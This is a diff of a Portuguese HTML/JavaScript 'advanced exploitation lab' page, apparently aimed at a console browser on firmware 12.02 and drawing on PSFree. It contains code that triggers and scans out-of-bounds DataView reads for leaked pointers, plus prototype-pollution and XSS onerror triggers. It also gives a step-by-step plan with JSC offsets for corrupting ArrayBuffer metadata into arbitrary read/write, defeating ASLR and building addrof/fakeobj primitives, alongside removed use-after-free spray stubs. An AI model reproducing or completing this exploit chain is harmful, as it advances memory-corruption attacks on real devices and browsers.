@@ -1,263 +1,358 @@
 <!DOCTYPE html>
-<html>
+<html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>Suite de Testes de Vulnerabilidades Completa (Direcionada FW 12.02?)</title>
+    <title>Laboratório de Exploração Avançada (v2.5 - Foco Intenso Passo 1 Simplificado)</title>
     <style>
-        /* Estilos CSS (mesmos do script anterior para consistência) */
-        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
-        #output { background: #222; border: 1px solid #444; padding: 10px; height: 70vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
-        .controls button { margin: 5px; padding: 8px; font-size: 14px; }
-        .log-info { color: #6cf; } .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; }
-        .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; } .log-vuln { color: #ff4444; font-weight: bold; } .log-good { color: #4CAF50; } .log-warn { color: #FFC107; } .log-error { color: #f44336; }
-        .log-critical { color: #f0f; font-weight: bold; } .log-leak { color: #FF9800; font-weight: bold; } .log-ptr { color: #f0f; font-weight: bold; }
-        .log-success { color: lightgreen; font-weight: bold; } .log-asm { color: #c0c0c0; font-style: italic; }
-        .src-Main {} .src-Setup {color: #aaa;} .src-Alloc {color: #bbb;} .src-GC {color: #c97;} .src-Leak {color: #daa;} .src-FakeObj {color: #ad7;}
-        .src-TestLogic {color: #8bf;} .src-Primitives {color: #ddd;} .src-IntegerOverflow {color: #f9a;} .src-TypeConfusion {color: #af9;}
-        .src-JIT {color: #9fa;} .src-APIAbuse {color: #a9f;} .src-OOBRead {color: #fa0;}
+        body { background: #1e1e1e; color: #d4d4d4; font-family: monospace; padding: 20px; font-size: 14px; }
+        .container { margin-bottom: 30px; padding: 15px; background-color: #252526; border: 1px solid #333; border-radius: 5px; }
+        h2 { color: #4ec9b0; border-bottom: 1px solid #4ec9b0; padding-bottom: 5px; }
+        h3 { color: #9cdcfe; margin-top: 20px; }
+        h4 { color: #ce9178; margin-top: 15px; }
+        button { background-color: #007acc; color: white; border: none; padding: 8px 15px; cursor: pointer; border-radius: 3px; margin: 5px 0; }
+        button:hover { background-color: #005a9e; }
+        textarea, input[type="text"] { background-color: #3c3c3c; color: #d4d4d4; border: 1px solid #555; padding: 5px; margin: 5px 0; width: 90%; font-family: monospace; }
+        #logOutput { background: #111; border: 1px solid #444; padding: 10px; height: 400px; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; font-size: 13px; }
+        .log-info { color: #6cf; } .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; } .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; } .log-vuln { color: #ff4444; font-weight: bold; } .log-good { color: #4CAF50; } .log-warn { color: #FFC107; } .log-error { color: #f44336; } .log-critical { color: #f0f; font-weight: bold; } .log-leak { color: #FF9800; font-weight: bold; } .log-ptr { color: #f0f; font-weight: bold; }
+        .log-escalation { background-color: #800000; color: #fff; font-weight: bold; padding: 1px 3px; border-radius: 3px; }
+        .log-tool { color: #7FFF00; font-weight: bold; } .log-analysis { color: #d7ba7d; }
+        .notes { background-color: #2a2a2a; padding: 10px; border-left: 3px solid #FFC107; font-style: italic; color: #aaa; margin-top:5px; margin-bottom:10px;}
+        .code-comment { color: #6A9955; font-style: italic; display: block; margin-top: 2px; margin-bottom: 2px;}
+        .todo { color: #FFC107; font-weight: bold; }
     </style>
 </head>
 <body>
-    <h1>Suite de Testes de Vulnerabilidades Completa (Direcionada FW 12.02?)</h1>
-    <p>Inclui UAF, Integer Overflow, Type Confusion, JIT, API Abuse, e OOB Read (Info Leak) conceituais. Comentários indicam onde aplicar a análise dos seus arquivos de assembly (FW 12.02) e do PSFree.</p>
-    <p><b>Atenção:</b> NENHUM destes são exploits funcionais. Servem como base para SUA pesquisa, DEBUG e MODIFICAÇÃO.</p>
-
-    <div class="controls">
-        <button id="runUAFBtn">1. Rodar Teste UAF (addrof)</button>
-        <button id="runIntegerOverflowBtn">2. Rodar Teste Integer Overflow</button>
-        <button id="runTypeConfusionBtn">3. Rodar Teste Type Confusion</button>
-        <button id="runJITBtn">4. Rodar Teste JIT Bug</button>
-        <button id="runAPIAbuseBtn">5. Rodar Teste API Abuse (WebGL)</button>
-        <button id="runOOBReadBtn">6. Rodar Teste OOB Read (Info Leak)</button>
-        <button id="clearLogBtn">Limpar Log</button>
-    </div>
-    <div id="output">Logs aparecerão aqui...</div>
+    <h1>Laboratório de Exploração Avançada (v2.5 - Foco Intenso Passo 1 Simplificado)</h1>
+    <div id="logOutput"></div>
 
     <script>
-        // Elementos HTML e funções utilitárias (log, hex, sleep)
-        const outputDiv = document.getElementById('output');
-        const runUAFBtn = document.getElementById('runUAFBtn');
-        const runIntegerOverflowBtn = document.getElementById('runIntegerOverflowBtn');
-        const runTypeConfusionBtn = document.getElementById('runTypeConfusionBtn');
-        const runJITBtn = document.getElementById('runJITBtn');
-        const runAPIAbuseBtn = document.getElementById('runAPIAbuseBtn');
-        const runOOBReadBtn = document.getElementById('runOOBReadBtn');
-        const clearLogBtn = document.getElementById('clearLogBtn');
+        const KB = 1024; const MB = KB * KB; const GB = KB * KB * KB;
+        class AdvancedInt64 { constructor(low, high) { let buffer = new Uint32Array(2); let bytes = new Uint8Array(buffer.buffer); if (arguments.length > 2) { throw TypeError('AdvancedInt64 takes at most 2 args'); } if (arguments.length === 0) { throw TypeError('AdvancedInt64 takes at min 1 args'); } let is_one = false; if (arguments.length === 1) { is_one = true; } if (!is_one) { if (typeof (low) !== 'number' && typeof (high) !== 'number') { throw TypeError('low/high must be numbers'); } } const check_range = (x) => (-0x80000000 <= x) && (x <= 0xffffffff); if (typeof low === 'number') { if (!check_range(low)) { throw TypeError('low not a valid value: ' + low); } if (is_one) { high = 0; if (low < 0) { high = -1; } } else { if (!check_range(high)) { throw TypeError('high not a valid value: ' + high); } } buffer[0] = low; buffer[1] = high; } else if (typeof low === 'string') { let hexstr = low; if (hexstr.substring(0, 2) === "0x") { hexstr = hexstr.substring(2); } if (hexstr.length % 2 === 1) { hexstr = '0' + hexstr; } if (hexstr.length > 16) { hexstr = hexstr.substring(hexstr.length - 16); } else { hexstr = hexstr.padStart(16, '0');} for (let i = 0; i < 8; i++) { bytes[i] = parseInt(hexstr.slice(14 - i*2, 16 - i*2), 16); } } else if (typeof low === 'object') { if (low instanceof AdvancedInt64) { bytes.set(low.bytes); } else if (low.length === 8) { bytes.set(low); } else { throw TypeError("Array must have exactly 8 elements."); } } else { throw TypeError('AdvancedInt64 does not support your object for conversion'); } this.buffer = buffer; this.bytes = bytes; } low() { return this.buffer[0]; } high() { return this.buffer[1]; } toString(is_pretty) { let lowStr = this.low().toString(16).padStart(8, '0'); let highStr = this.high().toString(16).padStart(8, '0'); if (is_pretty) { highStr = highStr.substring(0, 4) + '_' + highStr.substring(4); lowStr = lowStr.substring(0, 4) + '_' + lowStr.substring(4); return '0x' + highStr + '_' + lowStr; } return '0x' + highStr + lowStr; } add(other) { if (!(other instanceof AdvancedInt64)) { other = new AdvancedInt64(other); } let newLow = (this.low() + other.low()) >>> 0; let carry = (this.low() & 0xFFFFFFFF) + (other.low() & 0xFFFFFFFF) > 0xFFFFFFFF ? 1 : 0; let newHigh = (this.high() + other.high() + carry) >>> 0; return new AdvancedInt64(newLow, newHigh); } sub(other) { if (!(other instanceof AdvancedInt64)) { other = new AdvancedInt64(other); } const negOther = other.neg(); return this.add(negOther); } neg() { const low = ~this.low(); const high = ~this.high(); const one = new AdvancedInt64(1,0); const res = new AdvancedInt64(low, high); return res.add(one); } eq(other) { if (!(other instanceof AdvancedInt64)) { other = new AdvancedInt64(other); } return this.low() === other.low() && this.high() === other.high(); } static Zero = new AdvancedInt64(0,0); static One = new AdvancedInt64(1,0); }
+        const readWriteUtils = { readBytes: (u8_view, offset, size) => { let res = 0; for (let i = 0; i < size; i++) { res += u8_view[offset + i] << (i * 8); } return res >>> 0; }, read16: (u8_view, offset) => readWriteUtils.readBytes(u8_view, offset, 2), read32: (u8_view, offset) => readWriteUtils.readBytes(u8_view, offset, 4), read64: (u8_view, offset) => { let resBytes = []; for (let i = 0; i < 8; i++) { resBytes.push(u8_view[offset + i]); } return new AdvancedInt64(resBytes); }, writeBytes: (u8_view, offset, value, size) => { for (let i = 0; i < size; i++) { u8_view[offset + i] = (value >>> (i * 8)) & 0xff; } }, write16: (u8_view, offset, value) => readWriteUtils.writeBytes(u8_view, offset, value, 2), write32: (u8_view, offset, value) => readWriteUtils.writeBytes(u8_view, offset, value, 4), write64: (u8_view, offset, value) => { if (!(value instanceof AdvancedInt64)) { throw TypeError('write64 value must be an AdvancedInt64'); } let low = value.low(); let high = value.high(); for (let i = 0; i < 4; i++) { u8_view[offset + i] = (low >>> (i * 8)) & 0xff; } for (let i = 0; i < 4; i++) { u8_view[offset + 4 + i] = (high >>> (i * 8)) & 0xff; } } };
+        const generalUtils = { logToDiv: (divId, message, type = 'info', funcName = '') => { const outputDiv = document.getElementById(divId); if (!outputDiv) return; try { const timestamp = `[${new Date().toLocaleTimeString()}]`; const prefix = funcName ? `[${funcName}] ` : ''; const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;"); const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation', 'tool', 'analysis'].includes(type) ? type : 'info'; if(outputDiv.innerHTML.length > 1200000){ outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 600000); outputDiv.innerHTML = `<span>[Log Truncado...]</span>\n` + outputDiv.innerHTML; } outputDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`; outputDiv.scrollTop = outputDiv.scrollHeight; } catch(e) { console.error(`Erro no log para ${divId}:`, e); if (outputDiv) outputDiv.innerHTML += `[${new Date().toLocaleTimeString()}] [LOGGING ERROR] ${String(e)}\n`; } }, toHexLab: (val, bits = 32) => { if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid'; let num = Number(val); if (bits <= 32) { num = num >>> 0; } const pad = Math.ceil(bits / 4); return '0x' + num.toString(16).toUpperCase().padStart(pad, '0'); } };
+        const log = (message, type = 'info', funcName = '') => generalUtils.logToDiv('logOutput', message, type, funcName);
+        const PAUSE_LAB = (ms = 100) => new Promise(r => setTimeout(r, ms));
+        const toHexS1 = (val, bits = 32) => { if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid'; let num = Number(val); if (bits <= 32) { num = num >>> 0; } const pad = Math.ceil(bits / 4); return '0x' + num.toString(16).toUpperCase().padStart(pad, '0'); };
+        const isPotentialPointer64S1 = (high, low) => { if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') return false; if (high === 0 && low === 0) return false; if (high === 0xFFFFFFFF && low === 0xFFFFFFFF) return false; if (high === 0xAAAAAAAA && low === 0xAAAAAAAA) return false; if (high === 0 && low < 0x100000) return false; return true; };
+        const isPotentialData32S1 = (val) => { if (val === null || typeof val !== 'number') return false; val = val >>> 0; if (val === 0 || val === 0xFFFFFFFF || val === 0xAAAAAAAA || val === 0xAAAAAAEE) return false; if (val < 0x1000) return false; return true; };
+        const SHORT_PAUSE_S1_LAB = 50;
+    </script>
+    <div class="container">
+        <h2>Passo 0: Ativadores de Vulnerabilidades Base (Reais)</h2>
+        <p class="notes">Estas funções ativam as primitivas OOB, PP e XSS baseadas na sua análise e logs anteriores. Certifique-se que `triggerOOB_real()` está fornecendo um `oob_dataview_real` funcional e, idealmente, um `oob_leaked_ptr_real`.</p>
+        <button onclick="triggerOOB_real()">Ativar Primitiva OOB R/W (Real)</button>
+        <button onclick="triggerPP_real()">Ativar Poluição de Protótipo (Real)</button>
+        <button onclick="triggerXSS_real()">Ativar XSS Básico (Real)</button>
+        <div id="xss-target-step0" style="border:1px dotted #ccc; padding:5px; margin-top:5px; min-height:30px;">Área para XSS Básico</div>
+        <script>
+            let oob_array_buffer_real = null; let oob_dataview_real = null; let oob_leaked_ptr_real = null; 
+            async function triggerOOB_real() { /* ... (Mesmo código da v2.4) ... */ const FNAME = 'triggerOOB_real (from testOOBReadInfoLeakEnhancedStoreS1)'; log(`--- Iniciando ${FNAME} ---`, 'test', FNAME); const bufferSize = 32; const writeValue = 0xEE; const oobWriteOffset = bufferSize; const readRangeStart = -64; const readRangeEnd = bufferSize + 64; const allocationSize = bufferSize + 256; const baseOffsetInBuffer = 128; const oobReadOffsets = []; for (let i = readRangeStart; i < readRangeEnd; i += 4) { oobReadOffsets.push(i); } let writeSuccess = false; let potentialLeakFoundCount = 0; oob_leaked_ptr_real = null; oob_dataview_real = null; oob_array_buffer_real = null; try { const buffer = new ArrayBuffer(allocationSize); oob_array_buffer_real = buffer; const dataView = new DataView(buffer); oob_dataview_real = dataView; for (let i = 0; i < buffer.byteLength; i++) { dataView.setUint8(i, 0xAA); } const writeTargetAddress = baseOffsetInBuffer + oobWriteOffset; await PAUSE_LAB(SHORT_PAUSE_S1_LAB); try { dataView.setUint8(writeTargetAddress, writeValue); log(`VULN: Escrita OOB U8 @${oobWriteOffset} (addr ${writeTargetAddress}) OK! Val=${toHexS1(writeValue, 8)}`, 'vuln', FNAME); log(`---> *** ALERTA: Primitivo Relevante (OOB Write Simples) ***`, 'escalation', FNAME); writeSuccess = true; } catch (e) { log(`Escrita OOB U8 @${oobWriteOffset} (addr ${writeTargetAddress}) FALHOU/Bloqueada: ${e.message}`, 'good', FNAME); log(`--- ${FNAME} Concluído (Escrita OOB Falhou) ---`, 'test', FNAME); return false; } await PAUSE_LAB(SHORT_PAUSE_S1_LAB); for (const readOffset of oobReadOffsets) { const readTargetAddress = baseOffsetInBuffer + readOffset; const relOffsetStr = `@${readOffset} (addr ${readTargetAddress})`; if (readTargetAddress >= 0 && readTargetAddress + 8 <= buffer.byteLength) { try { const low = dataView.getUint32(readTargetAddress, true); const high = dataView.getUint32(readTargetAddress + 4, true); if (isPotentialPointer64S1(high, low)) { const vStr = `H=${toHexS1(high)} L=${toHexS1(low)}`; log(` -> PTR? U64 ${relOffsetStr}: ${vStr}`, 'ptr', FNAME); potentialLeakFoundCount++; if (oob_leaked_ptr_real === null) { oob_leaked_ptr_real = { value: new AdvancedInt64(low, high), type: 'U64', offset_in_oob_buffer: readTargetAddress, original_dataview: dataView }; log(` -> VALOR U64 ARMAZENADO ${relOffsetStr}.`, 'vuln', FNAME); log(` ---> *** ALERTA: Primitivo Relevante (OOB Read Pointer Leak) ***`, 'escalation', FNAME); } } } catch (e) {} } if (oob_leaked_ptr_real === null && readTargetAddress >= 0 && readTargetAddress + 4 <= buffer.byteLength) { try { const val32 = dataView.getUint32(readTargetAddress, true); if (isPotentialData32S1(val32)) { log(` -> Leak U32? ${relOffsetStr}: ${toHexS1(val32)}`, 'leak', FNAME); potentialLeakFoundCount++; oob_leaked_ptr_real = { value: new AdvancedInt64(val32, 0), type: 'U32', offset_in_oob_buffer: readTargetAddress, original_dataview: dataView }; log(` -> VALOR U32 ARMAZENADO ${relOffsetStr}.`, 'vuln', FNAME); log(` ---> *** ALERTA: Potencial Vazamento Info OOB Read U32 ***`, 'escalation', FNAME); } if (readOffset === oobWriteOffset && val32 === (writeValue | (0xAA << 8) | (0xAA << 16) | (0xAA << 24))) { log(` -> Leu valor OOB escrito (${toHexS1(val32)}) ${relOffsetStr}! Confirma R/W.`, 'vuln', FNAME); } } catch (e) {} } if (readOffset % 32 === 0) await PAUSE_LAB(1); } } catch (e) { log(`Erro fatal em ${FNAME}: ${e.message}`, 'error', FNAME); console.error(e); } finally { const leakStatus = oob_leaked_ptr_real ? `1 valor ${oob_leaked_ptr_real.type} @${oob_leaked_ptr_real.offset_in_oob_buffer}` : 'nenhum valor armazenado'; log(`--- ${FNAME} Concluído (${potentialLeakFoundCount} leaks potenciais?, ${leakStatus}) ---`, 'test', FNAME); if (oob_dataview_real) { log("`oob_dataview_real` e `oob_leaked_ptr_real` (se houver vazamento) estão prontos para uso.", "good", FNAME); } } return writeSuccess; }
+            async function triggerPP_real() { /* ... (Mesmo código da v2.4) ... */ const FNAME = 'triggerPP_real (from testBasicPPS1)'; log(`--- Iniciando ${FNAME} ---`, 'test', FNAME); const prop = '__lab_pp_real__'; const val = 'Polluted_Lab_Value_Real!'; let ok = false; try { Object.prototype[prop] = val; await PAUSE_LAB(SHORT_PAUSE_S1_LAB); let testObj = {}; const inheritedValue = testObj[prop]; if (inheritedValue === val) { log(`VULN: PP Básica REAL OK! Objeto herdou a propriedade poluída '${prop}'.`, 'vuln', FNAME); ok = true; } else { log(`PP Básica REAL falhou ou não detectada para '${prop}'.`, 'good', FNAME); } } catch (e) { log(`Erro durante ${FNAME}: ${e.message}`, 'error', FNAME); console.error(e); } finally { try { delete Object.prototype[prop]; } catch(e){ log(`Erro ao limpar Object.prototype.${prop}: ${e.message}`, 'error', FNAME); } } log(`--- ${FNAME} Concluído (PP Básica ${ok ? 'OK' : 'Falhou'}) ---`, 'test', FNAME); return ok; }
+            async function triggerXSS_real() { /* ... (Mesmo código da v2.4) ... */ const FNAME = 'triggerXSS_real (from testCSPBypassS1)'; log(`--- Iniciando ${FNAME} ---`, 'test', FNAME); const targetDiv = document.getElementById('xss-target-step0'); targetDiv.innerHTML = ''; try { const imgTag = document.createElement('img'); const imgSrc = 'invalid_img_' + Date.now(); imgTag.src = imgSrc; const onerrorPayload = ` this.onerror=null; this.src=''; try { log("XSS REAL via ONERROR Executado!", "vuln", "XSS Payload (Real)"); const targetLog = document.getElementById('xss-target-step0'); if(targetLog) { const logMsg = document.createElement('span'); logMsg.className = 'log-vuln'; logMsg.innerHTML = "<br>XSS REAL ONERROR OK!"; targetLog.appendChild(logMsg); } } catch(e) { log("Erro payload onerror: " + e.message, "warn", "XSS Payload (Real)"); }`; imgTag.setAttribute('onerror', onerrorPayload); targetDiv.appendChild(imgTag); await PAUSE_LAB(SHORT_PAUSE_S1_LAB * 2); } catch (e) { log(`Erro ao criar/adicionar img onerror: ${e.message}`, 'error', FNAME); } log(`--- ${FNAME} Concluído ---`, 'test', FNAME); }
+        </script>
+    </div>
 
-        function log(message, type = 'info', source = 'System') {
-            const logClass = `log-${type}`; const sourceClass = `src-${source}`;
-            outputDiv.innerHTML += `<span class="${logClass} ${sourceClass}">[${source}] ${message}\\n</span>`;
-            outputDiv.scrollTop = outputDiv.scrollHeight;
-        }
-        function hex(value) {
-             if (typeof value === 'number') { return '0x' + value.toString(16).toUpperCase(); }
-             else if (typeof value === 'bigint') { return '0x' + value.toString(16).toUpperCase(); }
-             else if (value === null) { return 'null'; } else if (value === undefined) { return 'undefined'; }
-             return String(value);
-         }
-        function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
+    <div class="container">
+        <h2>Passo 1: Primitivas Fundamentais: R/W Arbitrário, Vazamento de Endereços, `addrof`/`fakeobj`</h2>
+        <p class="notes">Este é o coração do exploit. Transformaremos sua OOB Write inicial em controle total da memória.</p>
+        
+        <h4>1.A: Desenvolver Leitura/Escrita Arbitrária (Corrupção de `ArrayBuffer`)</h4>
+        <p class="notes"><b>Estratégia Central:</b> Usar `oob_dataview_real` (sua primitiva OOB inicial) para encontrar e sobrescrever os metadados (`m_vector` e `m_byteLength`) de um `ArrayBuffer` vítima (`victim_view_for_arb_rw.buffer`).</p>
+        <div class="code-comment">
+        <b>Offsets Críticos (Baseado na SUA ANÁLISE de Disassembly e `Offsets JSCell.txt`):</b><br>
+        - <span class="todo">`JSC_VIEW_TO_BACKING_STORE_PTR_OFFSET`</span>: Hipótese `0x20`. Offset do JSCell de um `ArrayBufferView` (como `Uint8Array`) para o *ponteiro* que aponta para o `ArrayBufferBackingStore` (ou `JSArrayBuffer`). <b class="todo">VOCÊ PRECISA CONFIRMAR ESTE OFFSET EXPERIMENTALMENTE.</b><br>
+        - <span class="todo">`OFFSET_BACKING_STORE_VECTOR_PTR`</span>: Confirmado como `0x10`. Offset DENTRO do `ArrayBufferBackingStore` para o ponteiro dos dados brutos (`m_vector`).<br>
+        - <span class="todo">`OFFSET_BACKING_STORE_BYTE_LENGTH`</span>: Confirmado como `0x20`. Offset DENTRO do `ArrayBufferBackingStore` para o tamanho (`m_byteLength`, provavelmente U32).<br>
+        - <span class="todo">`OFFSET_JSCELL_STRUCTURE_ID`</span>: Confirmado como `0x0` (do `Offsets JSCell.txt`). Útil para `addrof`.
+        </div>
+        <p class="notes"><b>Fluxo de Trabalho Sugerido:</b>
+            <ol>
+                <li><b>Ativar OOB (Passo 0):</b> Garanta que `oob_dataview_real` e `oob_array_buffer_real` estejam funcionais.</li>
+                <li><b>`setupHeapAndVictim()`:</b> Execute para criar `victim_view_for_arb_rw` (um `Uint8Array`).</li>
+                <li><b>Implementar `addrof_primitive` (Passo 1.C primeiro!):</b> Você *precisa* de `addrof` para encontrar o endereço do `JSCell` do `victim_view_for_arb_rw`. Sem isso, a corrupção direcionada é quase impossível.</li>
+                <li><b>`attemptArrayBufferCorruptionAndSetupArbRW()`:</b>
+                    <ul>
+                        <li>Usa `addrof` para obter `addr_jscell_victim_view`.</li>
+                        <li>Usa sua (ainda a ser desenvolvida) `arb_read_primitive` inicial (que pode ser baseada em `oob_dataview_real` se você conseguir um bom alcance OOB) para ler o ponteiro para o `BackingStore`.</li>
+                        <li>Usa sua (ainda a ser desenvolvida) `arb_write_primitive` inicial (ou `oob_dataview_real`) para sobrescrever `m_vector` e `m_byteLength` no `BackingStore`.</li>
+                    </ul>
+                </li>
+            </ol>
+        </p>
+        <button onclick="attemptArrayBufferCorruptionAndSetupArbRW()">Tentar Corromper `ArrayBuffer` e Definir R/W Arbitrário</button> <br>
+        
+        <h4>1.B: Vazar Endereços Base (ASLR Bypass)</h4>
+        <p class="notes">Após obter `arb_read_primitive` no Passo 1.A, use-a para escanear a memória e encontrar os endereços base dos módulos.</p>
+        <button onclick="attemptBaseAddressLeak()">Tentar Vazar Endereços Base</button>
+        <br>
+        Endereço inicial para busca de valor: <input type="text" id="searchRangeStartAddress" placeholder="0xEndereçoVazado (ou deixe em branco)">
+        Tamanho da busca (bytes): <input type="text" id="searchRangeSize" value="8192" placeholder="bytes">
+        Valor/Padrão a buscar (hex, ex: 7f454c46 para ELF): <input type="text" id="searchKnownValue" value="7f454c46" placeholder="Hex bytes (ex: 7f454c46 ELF)">
+        <button onclick="searchMemoryForValue()">Buscar Valor na Memória</button>
 
-        // --- Teste 1: UAF (addrof) ---
-        // Esta seção é onde a análise dos seus arquivos de assembly da FW 12.02 e
-        // as técnicas do PSFree são MAIS CRÍTICAS.
-        let uaf_leakerObj = null;
-        let uaf_sprayArr = [];
-        // TODO: Estes valores (NUM_SPRAY_OBJS, OBJ_SIZE) devem ser ajustados com base na análise
-        // do heap e do objeto alvo do UAF na FW 12.02. Inspirar-se no PSFree.
-        const UAF_NUM_SPRAY_OBJS = 200;
-        const UAF_OBJ_SIZE = 0x100; // Tamanho exemplo. O PSFree usa tamanhos específicos.
+        <h4>1.C: Implementar Primitivas `addrof` e `fakeobj`</h4>
+        <p class="notes">`addrof(obj)`: Retorna o endereço de memória de `obj`. <br>
+           `fakeobj(addr)`: Cria um objeto JS que trata `addr` como seu buffer de dados interno.</p>
+        <button onclick="manualSetupAndAddrofTest()">1. Preparar Vítima e Testar `addrof(obj)`</button>
+        <button onclick="testFakeobj()">2. Testar `fakeobj(addr)` (após `addrof` funcionar)</button>
+        <br>
+        Nome do objeto para `addrof`: <input type="text" id="addrofObjectName" value="victim_view_for_arb_rw_GLOBAL" placeholder="victim_view_for_arb_rw_GLOBAL">
+        Endereço para `fakeobj`: <input type="text" id="fakeobjAddress" value="0x100000000" placeholder="0xEndereçoParaFakeObj">
 
-        // TODO: Definir aqui os OFFSETS CORRETOS para FW 12.02, derivados da análise dos seus
-        // arquivos de assembly (`funcoes especificas.txt`, `JSCell.txt`, `JSC ArrayBuffer.txt`, etc.)
-        // e comparando com `offset.txt` do PSFree para saber *quais* offsets procurar.
-        const FW1202_OFFSETS = {
-            // Exemplo de como você preencheria isto (valores fictícios!):
-            // JSCell_m_type: 0x5, // Inferido de `mov al, [rdi+5]` em deleteProperty
-            // JSObject_m_butterfly: 0x8, // Comum, mas verificar na 12.02
-            // ArrayBufferView_m_vector: 0x10, // De JSObjectGetArrayBufferBytesPtr -> [rbx+10h] -> [rax+10h] ?
-            // ArrayBufferView_m_length: 0x18,
-            // ArrayBufferContents_m_data: 0x10, // Inferido de JSObjectGetArrayBufferBytesPtr -> [rax+10h]
-            // ArrayBufferContents_isWebAssembly: 0x5C, // De JSObjectGetArrayBufferBytesPtr -> [rax+5Ch]
-            // ArrayBufferContents_isLocked: 0x5D, // De JSObjectGetArrayBufferBytesPtr -> [rax+5Dh]
-            placeholder: 0x0 // REMOVER ESTE PLACEHOLDER
-        };
-        if (Object.keys(FW1202_OFFSETS).length <= 1) { // Checa se apenas o placeholder existe
-             log("ALERTA CRÍTICO: FW1202_OFFSETS precisam ser preenchidos com valores REAIS da FW 12.02 para o Teste UAF funcionar!", 'critical', 'Setup');
-        }
+        <script>
+            let arb_read_primitive = null;    // function(address: AdvancedInt64, size: number): Uint8Array | null
+            let arb_write_primitive = null;   // function(address: AdvancedInt64, data: Uint8Array | Array<number>): boolean
+            let addrof_primitive = null;      // function(obj: any): AdvancedInt64 | null
+            let fakeobj_primitive = null;     // function(address: AdvancedInt64): any | null
+            let test_obj_lab = { p1: 123, p2: "test_lab_obj_v2.5" }; 
 
-        function uaf_setupPrimitives() {
-            const FNAME = 'uaf_setupPrimitives'; log("Iniciando setupPrimitives (UAF)...", 'info', FNAME);
-            try {
-                uaf_leakerObj = new ArrayBuffer(UAF_OBJ_SIZE);
-                uaf_sprayArr = new Array(UAF_NUM_SPRAY_OBJS);
-                log(`Spray array [${UAF_NUM_SPRAY_OBJS}] e leaker (ArrayBuffer ${UAF_OBJ_SIZE} bytes) preparados.`, 'good', FNAME);
+            let base_libkernel = null;      let base_libkernel_web = null; let base_webkit = null;
+
+            const JSC_VIEW_TO_BACKING_STORE_PTR_OFFSET = new AdvancedInt64(0x20); 
+            const OFFSET_BACKING_STORE_VECTOR_PTR = new AdvancedInt64(0x10);    
+            const OFFSET_BACKING_STORE_BYTE_LENGTH = new AdvancedInt64(0x20);   
+            const OFFSET_JSCELL_STRUCTURE_ID = new AdvancedInt64(0x0);
+            const OFFSET_JSCELL_INDEXING_TYPE_MISC = new AdvancedInt64(0x8);
+            
+            // Placeholder: Offsets DENTRO do JSCell de um JSArray para o butterfly e length (PRECISAM SER ENCONTRADOS!)
+            const OFFSET_JSARRAY_JSCell_TO_BUTTERFLY_PTR = new AdvancedInt64(0x10); // EXEMPLO!
+            const OFFSET_JSARRAY_JSCell_TO_LENGTH_FIELD = new AdvancedInt64(0x18); // EXEMPLO! (para o campo 'length' do JSArray)
+
+
+            let victim_view_for_arb_rw = null; 
+            let corrupted_data_view_for_arb_rw = null;  
+            let addr_jscell_victim_view = null; 
+            let addr_backing_store_of_victim = null; 
+            window.victim_view_for_arb_rw_GLOBAL = null; // Para acesso pelo input de addrof
+
+            async function setupHeapAndVictim() { /* ... (mesmo da v2.4, mas expõe victim_view_for_arb_rw_GLOBAL) ... */
+                const FNAME = "setupHeapAndVictim";
+                log("Configurando heap e objeto vítima...", "info", FNAME);
+                if (!oob_dataview_real) { log("OOB não ativado.", "error", FNAME); return false; }
+                let spray = []; for(let i=0; i<50; i++) spray.push(new Uint32Array(128 + i*4));
+                const victim_size = 256; 
+                let potential_victims = [];
+                for(let i=0; i<10; i++) { potential_victims.push(new Uint8Array(victim_size + i)); }
+                victim_view_for_arb_rw = potential_victims[Math.floor(potential_victims.length / 2)]; 
+                for(let i=0; i<victim_view_for_arb_rw.length; i++) victim_view_for_arb_rw[i] = (i % 2 === 0) ? 0xDD : 0xEE ;
+                window.victim_view_for_arb_rw_GLOBAL = victim_view_for_arb_rw; 
+                log(`victim_view_for_arb_rw (Uint8Array de ${victim_view_for_arb_rw.byteLength} bytes) criado e exposto como window.victim_view_for_arb_rw_GLOBAL. Padrão DDEE.`, "info", FNAME);
+                log("Próximo passo crítico: Implementar e testar `addrof_primitive` para obter o endereço do JSCell de `victim_view_for_arb_rw_GLOBAL`.", "warn", FNAME);
                 return true;
-            } catch (e) { log(`Erro em setupPrimitives (UAF): ${e.message}`, 'error', FNAME); return false; }
-        }
-        function uaf_allocateBuffer(size) { try { return new ArrayBuffer(size); } catch (e) { log(`Falha ao alocar buffer (UAF) de ${size}: ${e.message}`, 'error', 'UAF_Alloc'); throw e;} }
-        function uaf_triggerGCOptimized() {
-            const FNAME = 'uaf_triggerGC'; log("Tentando acionar GC (UAF)...", 'info', FNAME);
-            try { let temp = []; for (let i = 0; i < 100; i++) { temp.push(new ArrayBuffer(1 * 1024 * 1024)); } temp = null; if (typeof WeakSet !== 'undefined') { let ws = new WeakSet(); for(let i=0; i<1000; ++i) ws.add({i});} log("GC (UAF) provavelmente acionada.", 'good', FNAME);
-            } catch (e) { log(`Aviso: Erro durante GC (UAF): ${e.message}`, 'warn', FNAME); }
-        }
-        function uaf_findLeakedPointer() {
-            const FNAME = 'uaf_findLeakedPointer'; log("Procurando ponteiro vazado (UAF)...", 'info', FNAME);
-            log("Implementação REAL de uaf_findLeakedPointer é NECESSÁRIA (UAF).", 'critical', FNAME);
-            log("  Isto envolve iterar pela 'uaf_sprayArr' e usar uma PRIMITIVA DE LEITURA (obtida pelo UAF)", 'asm', FNAME);
-            log("  para inspecionar a memória, usando FW1202_OFFSETS corretos.", 'asm', FNAME);
-            log("Nenhum ponteiro vazado encontrado (UAF - Lógica Real Necessária).", 'warn', FNAME); return null;
-        }
